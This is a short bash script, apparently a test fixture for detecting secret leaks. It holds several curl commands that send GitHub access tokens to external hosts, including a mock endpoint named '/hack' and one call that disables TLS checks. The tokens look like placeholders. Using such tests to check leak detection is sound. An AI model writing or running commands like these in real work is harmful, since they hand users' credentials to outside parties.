#!/bin/bash

# Sending a POST request with a GitHub token (LEAK)
curl "https://api.veribom.com/graphql?GH=ghp_DEFzmg7RHrQ2eMe2IF4NxNWQodYpab3VMXXX"

curl "https://api.veribom.com/graphql?GH=ghp_XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"

curl -k -X POST https://vbirmock.free.beeceptor.com/hack \
    -H "Content-Type: application/json" \
    -d '{
        "GH": "ghp_DEFzmg7RHrQ2eMe2IF4NxNWQodYpab3VMXXX"
    }'

curl -k -X POST https://api.github.com/endpoint \
    -d '{
        "name": "ghp_1234567890abcdef1234567890abcdef12345678",
        "description": "A description of my repository"
    }'
